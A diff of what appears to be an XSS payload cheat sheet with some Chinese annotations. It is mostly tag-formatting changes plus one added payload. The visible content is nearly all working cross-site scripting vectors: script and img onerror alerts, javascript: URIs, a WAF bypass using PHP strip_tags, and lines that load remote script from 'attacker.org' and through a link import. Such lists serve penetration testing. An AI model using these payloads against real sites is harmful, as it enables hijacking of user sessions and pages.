@@ -24,7 +24,7 @@
 
 ---
 
-```h
+```html
 <script>
 <script>alert(123)</script>
 <script>prompt(1);</script>
@@ -56,7 +56,7 @@
 <script>alert("XSS")</script>
 <script src="http://attacker.org/malicious.js"></script>
 ```
-```h
+```html
 <img>
 <img src=1 onerror=alert(1)>
 <img src=x onerror=alert(123) />
@@ -145,7 +145,7 @@ onscroll=alert("xss");><br><br><br><br><br><br><br><br><br><br><br><br><br><br><
 <embed>
 <embed/src=javascript:alert(29);>
 ```
-```h
+```html
 利用link远程包含js文件
 PS:在无CSP的情况下才可以
 <link rel=import href="http://127.0.0.1/1.js">
@@ -187,8 +187,10 @@ background属性
 ¼script¾alert(¢XSS¢)¼/script¾
 
 <portal id="q" src="bing.com" onload="print(q.activate())"></portal>
+
+<script>onerror=alert;throw 1337</script>
 ```
-```h
+```html
 Classical #XSS WAF Bypass
 Inline HTMLi + #PHP Strip Tags
 
@@ -198,7 +200,7 @@ Code:
 PoC:
 ?url="onm<>ouseover="ale<>rt(1)
 ```
-```h
+```html
 无害,仅测试
 1<b>1
 <table style="left: 0px; top: 0px; position: fixed;z-index: 5000;position:absolute;width:100%;height:300%;background-color: black;"><tbody><tr><td style="color:#FFFFFF;z-index: 6000;vertical-align:top;"><h1>test</h1></td></tr></tbody></table>
